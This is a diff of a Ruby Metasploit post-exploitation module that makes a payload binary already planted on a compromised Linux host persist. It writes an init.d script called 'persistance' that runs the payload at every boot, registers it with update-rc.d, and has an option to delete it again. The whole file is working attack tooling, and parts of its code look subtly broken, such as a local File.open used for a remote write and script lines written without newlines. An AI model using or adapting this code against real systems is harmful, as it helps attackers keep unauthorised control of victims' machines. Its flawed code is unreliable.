@@ -14,18 +14,17 @@
 #
 # [ DESCRIPTION ]
 # Builds 'persistance' init.d startup script that allow users to persiste
-# your elf binary (linux executable) on Linux Kali distros at every startup
-# This post-exploitation module requires the payload allready deployed
-# in target system and root privileges (in non-Kali distros).
+# your elf binary (linux executable) on Linux Kali distros at every startup.
+# HINT: This post-exploitation module requires the payload allready deployed.
 # HINT: In Kali distos we are 'root' by default, so this post module does
-# not required privilege escalation in systems were we are allread root ..
+# not required privilege escalation in systems were we are allready root ..
 #
 #
 # [ MODULE OPTIONS ]
 # The session number to run this module on           => set SESSION 3
 # The full remote path of binary to execute (remote) => set REMOTE_PATH /root/payload
 # The full remote path of init.d directory  (remote) => set INIT_PATH /etc/init.d
-# Delete persistence script/configurations           => set DEL_PERSISTENCE true
+# Delete persistence script/configurations  (remote) => set DEL_PERSISTENCE true
 #
 #
 # [ PORT MODULE TO METASPLOIT DATABASE ]
@@ -65,7 +64,6 @@ require 'msf/core/post/common'
 
 
 
-
 #
 # Metasploit Class name and includes
 #
@@ -78,14 +76,14 @@ class MetasploitModule < Msf::Post
 
 
 
-# -----------------------------------------
+#
 # Building Metasploit/Armitage info GUI/CLI
-# -----------------------------------------
+#
         def initialize(info={})
                 super(update_info(info,
                         'Name'          => 'Linux Kali init.d persistence post-module',
                         'Description'   => %q{
-                                        Builds 'persistance' init.d startup script that allow users to persiste your elf binary (linux executables) on Linux Kali distros at every startup. This post-exploitation module requires the payload allready deployed in target system and root privileges active (in non-Kali distros).
+                                        Builds 'persistance' init.d startup script that allow users to persiste your elf binary (linux executables) on Linux Kali distros at every startup. This post-exploitation module requires the payload allready deployed in target system and root privileges active (if non-Kali distros).
                         },
                         'License'       => UNKNOWN_LICENSE,
                         'Author'        =>
@@ -143,9 +141,9 @@ def ls_stage1
 
   session = client
   rem = session.sys.config.sysinfo
-  init_check = datastore['INIT_PATH']        # /etc/init.d
-  remote_path = datastore['REMOTE_PATH']     # /root/payload
-  script_check = "#{init_check}/persistance" # /etc/init.d/persistance
+  init = datastore['INIT_PATH']          # /etc/init.d
+  script_check = "#{init}/persistance"   # /etc/init.d/persistance
+  remote_path = datastore['REMOTE_PATH'] # /root/payload
   #
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options ..
@@ -159,20 +157,30 @@ def ls_stage1
     Rex::sleep(1.0)
   end
 
+
+    #
+    # Check if persistence its allready active ..
+    #
+    if session.fs.file.exist?(script_check)
+      vprint_error("%red" + "init.d: #{script_check} found ..")
+      vprint_error("Post-module reports that persistence its allready active ..")
+      vprint_error("Please use DEL_PERSISTENCE option before running this funtion ..")
+      return nil
+    end
     #
     # Check if agent its deployed (remote) ..
     #
     if not session.fs.file.exist?(remote_path)
       vprint_error("%red" + "agent: #{remote_path} not found ..")
-      vprint_error("Please upload your agent before running this module ..")
+      vprint_error("Please upload your agent before running this funtion ..")
       return nil
     end
     vprint_status("Remote agent full path found ..")
     #
     # Check init.d directory existance (remote)..
     #
-    if not session.fs.directory.exist?(init_check)
-      vprint_error("%red" + "path: #{init_check} not found ..")
+    if not session.fs.directory.exist?(init)
+      vprint_error("%red" + "path: #{init} not found ..")
       vprint_error("Please set a diferent path in 'INIT_PATH' option ..")
       return nil
     end
@@ -183,8 +191,7 @@ def ls_stage1
       #
       vprint_warning("Writing init.d persistence startup script ..")
       Rex::sleep(1.0)
-      vprint_good("Service path: #{init_check}/persistance")
-      File.open("#{init_check}/persistance", "w+") do |f|
+      File.open("#{init}/persistance", "w+") do |f|
         f.write("#!/bin/sh")
         f.write("### BEGIN INIT INFO")
         f.write("# Provides:          persistence on kali")
@@ -199,7 +206,10 @@ def ls_stage1
         f.write("# Give a little time to execute elf agent")
         f.write("sleep 5 > /dev/null")
         f.write("./#{remote_path}")
+        f.close
       end
+      vprint_good("Service path: #{init}/persistance")
+      Rex::sleep(1.0)
 
       #
       # Config init.d startup service (chmod + update-rc.d)
@@ -208,18 +218,19 @@ def ls_stage1
         vprint_good("Config init.d persistence script ..")
         Rex::sleep(1.0)
         cmd_exec("chmod +x #{script_check}")
-        vprint_good("Update init.d service status (symlinks)..")
+        vprint_good("Update init.d service status (symlinks) ..")
         Rex::sleep(1.0)
         cmd_exec("update-rc.d persistance defaults # 97 03")
       else
         vprint_error("%red" + "init.d script: #{script_check} not found ..")
+        vprint_error("Persistence not achieved ..")
         return nil
       end
 
     #
     # Final displays to user ..
     #
-    vprint_status("Persistence activated on: #{rem['Computer']}")
+    vprint_status("Persistence achieved on: #{rem['Computer']}")
     Rex::sleep(1.0)
     vprint_line("")
 
@@ -241,8 +252,8 @@ def ls_stage2
 
   session = client
   rem = session.sys.config.sysinfo
-  init_check = datastore['INIT_PATH']        # /etc/init.d
-  script_check = "#{init_check}/persistance" # /etc/init.d/persistance
+  init = datastore['INIT_PATH']        # /etc/init.d
+  script_check = "#{init}/persistance" # /etc/init.d/persistance
   #
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options ..
@@ -270,17 +281,17 @@ def ls_stage2
       #
       vprint_status("Remove script from init.d directory ..")
       Rex::sleep(1.0)
-      cmd_exec("rm -f #{init_check}/persistance")
+      cmd_exec("rm -f #{init}/persistance")
       vprint_status("Delete persistence service (symlinks) ..")
       cmd_exec("update-rc.d persistance remove")
       Rex::sleep(1.5)
 
     #
-    # Check init.d persiste script existance ..
+    # Check init.d persiste script existance (after delete) ..
     #
     if session.fs.file.exist?(script_check)
       vprint_error("%red" + "script: #{script_check} not proper deleted ..")
-      vprint_error("Please manually delete : rm -f #{init_check}/persistance")
+      vprint_error("Please manually delete : rm -f #{init}/persistance")
       vprint_error("Please manually execute: update-rc.d persistance remove")
       return nil
     end
@@ -340,7 +351,8 @@ def run
     #
     # check for proper operative system (Linux Kali)
     # if not distro =~ /Kali/
-    if not sysinfo['OS'] =~ /Linux/
+    # if not sysinfo['OS'] =~ /Linux/
+    if not session.platform.include?("linux")
       vprint_error("%red" + "[ ABORT ]: This module only works againt Linux systems")
       return nil
     end
@@ -363,9 +375,9 @@ def run
     end
 
 
-# ------------------------------------
+#
 # Selected settings to run
-# ------------------------------------
+#
       if datastore['REMOTE_PATH']
          ls_stage1
       end
